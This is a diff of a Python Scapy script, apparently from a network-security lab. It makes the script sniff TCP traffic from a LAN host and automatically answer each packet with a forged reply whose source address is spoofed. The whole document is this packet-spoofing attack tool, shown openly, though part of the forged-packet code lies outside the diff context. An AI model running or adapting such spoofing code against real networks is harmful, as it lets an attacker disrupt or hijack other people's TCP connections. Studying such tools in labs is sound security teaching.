@@ -1,9 +1,10 @@
+#!/usr/bin/python3
 from scapy.all import *
 from scapy.all import send
 from scapy.layers.inet import *
 
-srcIP = "192.168.0.103"
-destIP = "192.168.0.108"
+# srcIP = "192.168.0.103"
+destIP = "192.168.0.103"
 
 def spoof_tcp(pkt):
     IPLayer = IP(dst=destIP, src=pkt[IP].dst)
@@ -13,10 +14,10 @@ def spoof_tcp(pkt):
     print("Spoofed Packet Sent...")
 
 while 1 > 0:
-    pkt = sniff(filter="tcp and src host " + destIP)
+    pkt = sniff(filter="tcp and src host " + destIP, prn=spoof_tcp)
 
-    print("Found Packet")
-    print(pkt)
+    # print("Found Packet")
+    # print(pkt)
 
     # spoof_tcp(pkt)
 
